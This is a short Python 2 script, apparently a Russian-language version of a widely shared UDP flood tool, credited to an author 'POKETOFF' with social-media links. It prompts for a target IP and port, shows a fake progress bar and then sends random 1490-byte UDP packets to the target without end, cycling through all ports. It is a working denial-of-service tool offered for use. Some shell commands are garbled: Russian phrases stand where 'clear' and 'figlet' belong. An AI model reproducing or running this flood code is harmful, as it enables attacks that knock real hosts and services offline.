import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "АВТОР   : POKETOFF"
print "You Tube : https://www.youtube.com/c/POKETOFF"
print "github   : https://github.com/poketoff"
print "Vk : vk.com/poketoff"
print
ip = raw_input("IP Цели : ")
port = input("Порт       : ")

os.system("Отчистить")
os.system("Фиглярная атака начинается")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Отправлено %s пакетов %s через порт:%s"%(sent,ip,port)
     if port == 65534:
       port = 1